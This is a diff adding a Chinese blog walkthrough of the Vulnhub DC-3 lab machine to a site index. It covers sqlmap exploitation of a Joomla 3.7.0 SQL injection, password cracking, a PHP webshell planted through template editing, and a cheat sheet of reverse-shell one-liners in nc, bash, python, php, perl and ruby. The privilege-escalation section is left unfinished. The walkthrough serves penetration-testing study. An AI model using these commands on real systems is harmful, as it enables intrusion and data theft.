@@ -317,7 +317,157 @@
   <entry>
     <title>Vulnhub-DC-3渗透学习</title>
     <url>/2022/06/11/Vulnhub-DC-3/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
+<p>攻击机：Kali-2021.3：192.168.8.105</p>
+<p>靶机：Vulnhub-DC-3：192.168.8.180</p>
+</blockquote>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/1.png" alt></p>
+<p>找到目标IP后继续扫描其开放端口</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -A -p- 192.168.8.180</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/2.png" alt></p>
+<p>看到它只开放了80端口，同时也扫描到了网站的CMS</p>
+<p>或者我们也可以用whatweb来扫描网站信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.180:80</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/3.png" alt></p>
+<p>再或者我们可以先访问IP的80端口，利用Firefox的插件来找出网站的相关信息</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/4.png" alt></p>
+<p>在网站首页有与一段文字，翻译一下，意思是只有一个flag，只有获得root权限才能找到</p>
+<blockquote>
+<p>欢迎来到 DC-3。 这一次，只有一个flag，一个入口，没有任何线索。 要获得flag，您显然必须获得 root 权限。 如何成为 root 取决于您 - 显然，取决于系统。 祝你好运 - 我希望你喜欢这个小挑战。 :-)</p>
+</blockquote>
+<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="1、漏洞分析"><a href="#1、漏洞分析" class="headerlink" title="1、漏洞分析"></a>1、漏洞分析</h2><p>首先我们知道它的CMS是<code>Joomla</code>，所以我们就使用专门的扫描工具来对其扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">joomscan --url http://192.168.8.180</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/5.png" alt></p>
+<p>可以看到它扫出了网站的CMS版本信息以及网站的管理员登录入口</p>
+<p>访问一下</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/6.png" alt></p>
+<p>现在我们知道了CMS版本信息，那么就来看看这个版本是否有漏洞吧</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/7.png" alt></p>
+<p>可以看到找到了一个SQL注入的漏洞，查看一下漏洞信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit -x php/webapps/42033.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/8.png" alt></p>
+<p>可以看到里面给出了payload，告诉我们使用sqlmap就可以了</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/9.png" alt></p>
+<p>发现了五个数据库，很明显第二个数据库是我们的目标</p>
+<ol>
+<li><p>查找数据库<code>joomladb</code>的所有表</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables -p list[fullordering]</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/10.png" alt></p>
+</li>
+<li><p>查看表<code>#__users</code>的内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns -p list[fullordering]</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/11.png" alt></p>
+</li>
+<li><p>查询字段<code>username</code>、<code>password</code>的内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;username,password&quot; --dump -p list[fullordering]</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/12.png" alt></p>
+<p>成功找到管理员账户密码</p>
+</li>
+</ol>
+<p>但这个密码是经过了<code>hash</code>加密，因此我们使用john爆破一下，把密码保存到文件里</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27; &gt; 1.txt</span><br><span class="line">john 1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/13.png" alt></p>
+<p>因为我之前已经爆破过了，第二次爆破<code>john</code>不会显示出结果，要想显示出结果，就使用</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john -show 1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/14.png" alt></p>
+<p>成功得到账号/密码</p>
+<blockquote>
+<p>admin</p>
+<p>snoopy</p>
+</blockquote>
+<h2 id="2、登录后台"><a href="#2、登录后台" class="headerlink" title="2、登录后台"></a>2、登录后台</h2><p><img src="/2022/06/11/Vulnhub-DC-3/15.png" alt></p>
+<p>然后就是寻找寻找有没有文件上传点、文件包含点之类的来拿到webshell</p>
+<p>寻找一段时间后发现在<code>Extensions-Templates-Templates</code>里可以新建并上传文件</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/16.png" alt></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/17.png" alt></p>
+<p>新建一个php文件，然后写入一句话木马</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/18.png" alt></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/19.png" alt></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/20.png" alt></p>
+<p>保存上传后，接下来就是找到这个文件的路径</p>
+<p>根据这句话大概能猜到这个文件所在的路径，也可以网上找找资料</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/21.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.8.180/templates/beez3/html/shell.php</span><br></pre></td></tr></table></figure>
+<h2 id="3、getshell并反弹shell"><a href="#3、getshell并反弹shell" class="headerlink" title="3、getshell并反弹shell"></a>3、getshell并反弹shell</h2><p>蚁剑连接</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/22.png" alt></p>
+<p>成功得到shell，然后开始反弹shell，反弹shell可以方便我们后面的提权</p>
+<p>kali开启监听</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/23.png" alt></p>
+<p>接下来就是反弹shell了</p>
+<p>总结一下常见的反弹shell的方法：</p>
+<ol>
+<li><p><strong>利用netcat反弹shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 192.168.8.105 2222 -e /bin/bash</span><br></pre></td></tr></table></figure>
+<p>如果<code>nc</code>无法使用<code>-e</code>参数时使用</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>利用Bash反弹shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.8.105/2222 0&gt;&amp;1</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.8.105/2222 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>各种脚本反弹shell</strong></p>
+<ul>
+<li><p><code>Python</code> 脚本反弹shell（当目标主机上有Python环境）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.8.105&quot;,2222	));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>php</code>脚本反弹shell（当目标主机上有php环境）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.8.105&quot;,2222);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>Perl</code>脚本反弹shell（当目标主机上有Perl环境）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.8.105&quot;;$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>Ruby</code>脚本反弹shell（当目标主机上有Ruby环境）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.8.105&quot;,&quot;2222&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<p>因此这里我们尝试使用<code>nc</code>进行反弹</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/24.png" alt></p>
+<p>但是发现目标主机上的<code>nc</code>无法使用<code>-e</code>参数</p>
+<p>因此这个方法行不通，那就使用这个来进行反弹</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/25.png" alt></p>
+<p>成功反弹</p>
+<h2 id="4、提权"><a href="#4、提权" class="headerlink" title="4、提权"></a>4、提权</h2><p>先来尝试一下能不能SUID提权以及有没有可以使用的免密的root权限的文件</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/26.png" alt></p>
+<p>发现并不存在我们可以很好利用的文件</p>
+<p>那就收集一下目标主机的一些信息吧</p>
+<ol>
+<li><p>查看操作系统的版本信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看操作系统的发行版本信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/issue</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/27.png" alt></p>
+</li>
+</ol>
+<p>得到对应的版本信息</p>
+<blockquote>
+<p>Linux 4.4.0-21</p>
+<p>Ubuntu 16.04（32-bit）</p>
+</blockquote>
+<p>那么就去寻找看看它是否有漏洞</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/28.png" alt></p>
+<p>可以看到有很多的漏洞，我们该如何选择呢</p>
+<p>通过上面得到的Linux的版本信息和Ubuntu是32位的我们可以排除掉一些，最后只剩下几个</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/29.png" alt></p>
+<p>然后因为C语言的脚本用起来比较复杂，所以我们优先看看39772.txt这个文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit -x linux/local/39772.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/30.png" alt></p>
+<p>里面告诉我们要去Github下载它的压缩包</p>
+<p>然后我们要找到目标主机上可以上传文件的地方，然后用<code>wget</code>进行下载即可，比如tmp目录，这是一个用来存储临时文件的地方，所以我们有权限往里面上传文件</p>
+<p>……….</p>
+<p>出了点小问题，待续</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123546254?spm=1001.2014.3001.5502">dc-3 靶机渗透学习_ZredamanJ的博客-CSDN博客_dc3靶机</a></p>
+<p><a href="https://blog.csdn.net/weixin_45996361/article/details/123054544">Vulnhub靶机：DC-3渗透详细过程_1erkeU的博客-CSDN博客</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1818091">反弹Shell,看这一篇就够了-腾讯云开发者社区-腾讯云</a></p>
+]]></content>
       <categories>
         <category>靶场&amp;靶机</category>
       </categories>
